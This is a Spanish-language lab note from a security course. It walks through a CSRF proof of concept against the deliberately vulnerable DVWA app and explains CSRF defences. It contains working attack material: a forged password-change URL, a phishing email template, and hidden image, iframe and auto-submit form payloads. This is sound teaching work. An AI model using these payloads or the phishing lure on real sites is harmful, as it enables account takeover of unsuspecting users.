---
title: "CSRF - Cross-Site Request Forgery (DVWA)"
date: "2026-10-08"
author: "Manuel FR"
tags:
  - ifct0109
  - poc
  - vulnerabilidades-web
  - web
  - dvwa
  - csrf
---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]

---
# CSRF - Cross-Site Request Forgery (DVWA)

# 🎭 CSRF (Cross-Site Request Forgery)

 
 

## 📖 Prueba de Concepto (PoC)

 

### 🔓 ¿Qué es CSRF?

 

**CSRF (Cross-Site Request Forgery)** es una vulnerabilidad web que afecta la seguridad de las aplicaciones en línea. También se conoce como **ataque de falsificación de solicitud entre sitios**. La CSRF ocurre cuando un atacante engaña a un usuario autenticado para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

 

> [!warning]
> 
 
> #### ⚠️ Impacto de un Ataque CSRF:
> 
 
> La gravedad de un ataque CSRF depende de las acciones que el usuario autenticado realice en el sitio web vulnerable. Por ejemplo, un ataque CSRF puede hacer que el usuario:
> 

> 
> * Cambie su contraseña
> 
> * Realice una compra no deseada
> 
> * Elimine contenido
> 
> * Transfiera fondos
> 
> * Modifique configuraciones de seguridad
> 
> * Realice acciones que puedan comprometer su seguridad o privacidad
> 

> 

 

### 🛡️ Medidas de Protección contra CSRF

 

Para mitigar el riesgo de CSRF, los desarrolladores pueden implementar medidas de seguridad, como:

 

> [!tip]
> 
 
> #### 🔐 Mecanismos de Defensa:
> 

> 

> 
> * 
> 
> **Token CSRF:** Incluir un token CSRF único en cada formulario o solicitud que realice cambios en el estado del servidor. Este token debe ser diferente para cada sesión y debe ser verificado por el servidor para validar la solicitud.
> 
> 
> * 
> 
> **Origen y Referente (Origin and Referer):** Verificar tanto el encabezado de origen (Origin) como el encabezado Referente (Referer) en las solicitudes para asegurarse de que provengan del mismo origen que el sitio web.
> 
> 
> * 
> 
> **Encabezados de solicitud HTTP:** Configurar adecuadamente los encabezados de solicitud HTTP para evitar solicitudes desde otros dominios o sitios no autorizados.
> 
> 
> * 
> 
> **Autenticación reforzada:** Implementar mecanismos adicionales de autenticación, como solicitar contraseñas adicionales o utilizar autenticación de dos factores, para reducir el impacto de los ataques CSRF.
> 
> 

> 

 

> [!note]
> 
 
> #### 💡 ¿Cómo Funciona un Ataque CSRF?
> 
 

> 
> 1. La víctima inicia sesión en un sitio web legítimo (ejemplo: banco.com)
> 
> 2. El sitio web genera una cookie de sesión que identifica al usuario
> 
> 3. El atacante engaña a la víctima para que visite una página maliciosa o haga clic en un enlace
> 
> 4. La página maliciosa envía una petición al sitio legítimo usando las credenciales de sesión de la víctima
> 
> 5. El sitio web ejecuta la acción porque la petición parece legítima (tiene la cookie de sesión válida)
> 

> 

 

 
 

## 🎯 Práctica con DVWA - Nivel Low

 

**Para la práctica vamos a usar la VM de DVWA y Kali Linux.**

 

### 🔧 Paso 1: Configuración Inicial

 

 
1. 

**Iniciamos ambas VM y en la VM de DVWA iniciamos sesión con las credenciales `admin:password`**
 
2. 

**Cambiamos la seguridad a "low" y vamos al menú "CSRF"**
 

 

### 🔍 Paso 2: Observar el Comportamiento Normal

 

 
1. 

**Cambiamos las credenciales a, por ejemplo, `SegInf` y observa la dirección web que se genera.**
 

 

> [!tip]
> 
 
> #### 🔍 Análisis de la URL:
> 
 
> Cuando cambias la contraseña, observarás que la URL generada contiene parámetros como:
> 
> ```
> http://dvwa_ip/vulnerabilities/csrf/?password_new=SegInf&password_conf=SegInf&Change=Change
> ```
> 
 
> **Problema de seguridad:** Los parámetros se envían por GET (visibles en la URL) y no hay protección CSRF.
> 
> Esto significa que cualquier enlace que construyamos con estos parámetros ejecutará el cambio de contraseña si el usuario está autenticado.
> 

 

### 💣 Paso 3: Construir el Ataque CSRF

 

 
1. 

**Copiamos la URL, la modificamos con nuestra clave maliciosa y por ingeniería social se enviaría el enlace con todos los cambios.**
 

 

> [!warning]
> 
 
> #### 🎣 Ejemplo de Ataque por Ingeniería Social:
> 
 
> **URL maliciosa:**
> 
> ```
> http://dvwa_ip/vulnerabilities/csrf/?password_new=atacante123&password_conf=atacante123&Change=Change
> ```
> 
 
> 
> **Vector de ataque - Email de phishing:**
> 

> [!note]
> 
 
> Hola Admin,
> 
> Hemos detectado actividad sospechosa en tu cuenta. Por favor, haz clic aquí para verificar tu cuenta.
> 
> Saludos,
> Equipo de Seguridad
> 

> 
 
> **¿Qué sucede?**
> 

> 
> * Si el administrador está autenticado en DVWA y hace clic en el enlace
> 
> * Su contraseña cambiará automáticamente a `atacante123`
> 
> * El atacante podrá iniciar sesión con las nuevas credenciales
> 
> * El usuario víctima NO verá ninguna confirmación ni advertencia
> 

> 

 

### 🔗 Paso 4: Técnicas Adicionales de Explotación

 

> [!note]
> 
 
> #### 🛠️ Vectores de Ataque Avanzados:
> 

> 
> #### 1. Imagen Invisible:
> 
 
> Colocar en un foro o sitio web malicioso:
> 
> ```
> <img src="http://dvwa_ip/vulnerabilities/csrf/?password_new=atacante123&password_conf=atacante123&Change=Change" width="0" height="0" />
> ```
> 
 
> La imagen no se ve, pero el navegador ejecuta la petición automáticamente.
> 
 
> #### 2. Iframe Oculto:
> 
 
> ```
> <iframe src="http://dvwa_ip/vulnerabilities/csrf/?password_new=atacante123&password_conf=atacante123&Change=Change" style="display:none;"></iframe>
> ```
> 

> 
> #### 3. JavaScript Auto-Submit:
> 
 
> ```
> <html>
> <body>
> <form action="http://dvwa_ip/vulnerabilities/csrf/" method="GET" id="csrf-form">
> <input type="hidden" name="password_new" value="atacante123" />
> <input type="hidden" name="password_conf" value="atacante123" />
> <input type="hidden" name="Change" value="Change" />
> </form>
> <script>document.getElementById('csrf-form').submit();</script>
> </body>
> </html>
> ```
> 
 
> Este código se auto-envía inmediatamente al cargar la página.
> 

 

### ✅ Paso 5: Verificar el Éxito del Ataque

 

 
1. Cierra la sesión del administrador en DVWA
 
2. Intenta iniciar sesión con `admin:atacante123`
 
3. Si el ataque fue exitoso, habrás accedido con la nueva contraseña
 

 

> [!warning]
> 
 
> **⚠️ Importante - Ética y Legalidad:**
> 
> Este tipo de ataques solo debe realizarse en entornos controlados de prueba como DVWA.
> 
> Realizar ataques CSRF contra sistemas reales sin autorización explícita es **ilegal** y puede tener consecuencias legales graves.
> 

 

 
 

## 📚 Resumen

 

> [!tip]
> 
 
> ### 🎓 Lo que hemos aprendido:
> 
 

> 
> * ✅ CSRF permite ejecutar acciones en nombre de usuarios autenticados
> 
> * ✅ Los ataques CSRF explotan la confianza del sitio web en el navegador del usuario
> 
> * ✅ Las peticiones GET para acciones críticas son especialmente vulnerables
> 
> * ✅ Los tokens CSRF son la defensa más efectiva
> 
> * ✅ Las URLs maliciosas pueden ocultarse en imágenes, iframes o auto-enviarse
> 
> * ✅ La ingeniería social es clave para el éxito de ataques CSRF
> 
> * ✅ CSRF + sesión activa = compromiso total de la cuenta
> 

> 
 
> ### 🔑 Conceptos Clave:
> 
 
> 
> 
> 
> 
> 
> 
> 
> 
> **CSRF**
> 
> 
> 
> **Token CSRF**
> 
> 
> 
> **Same-Origin Policy**
> 
> 
> 
> **GET vs POST**
> 
> 
> 
> **Referer Header**
> 
> 
> 
> 
> | Concepto | Descripción |
> | --- | --- |
> | | Falsificación de petición entre sitios - ataque que ejecuta acciones no autorizadas |
> | | Valor aleatorio único que valida que la petición es legítima |
> | | Política de seguridad que restringe peticiones entre diferentes dominios |
> | | GET envía parámetros en URL (vulnerable), POST en cuerpo de petición (más seguro) |
> | | Cabecera HTTP que indica el origen de la petición |
> 

> 
> ### 🛡️ Defensas contra CSRF:
> 
 
> 
> 
> 
> 
> 
> 
> 
> 
> 
> **Token CSRF**
> 
> 
> 
> 
> **SameSite Cookies**
> 
> 
> 
> 
> **Verificar Referer**
> 
> 
> 
> 
> **Doble Submit Cookie**
> 
> 
> 
> 
> **Re-autenticación**
> 
> 
> 
> 
> 
> | Defensa | Efectividad | Implementación |
> | --- | --- | --- |
> | | 🟢 Muy Alta | Generar token único por sesión/formulario |
> | | 🟢 Alta | Configurar cookies con atributo SameSite=Strict |
> | | 🟡 Media | Validar que Referer header proviene del mismo dominio |
> | | 🟢 Alta | Enviar token tanto en cookie como en parámetro |
> | | 🟢 Alta | Solicitar contraseña para acciones críticas |
> 

> 
> ### 🎯 Navegación:
> 
 
> ← Anterior: 02 - Brute Force
> 
> → Siguiente: 04 - Local File Inclusion
> 
> ↑ Volver al Índice del Módulo
>

---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]
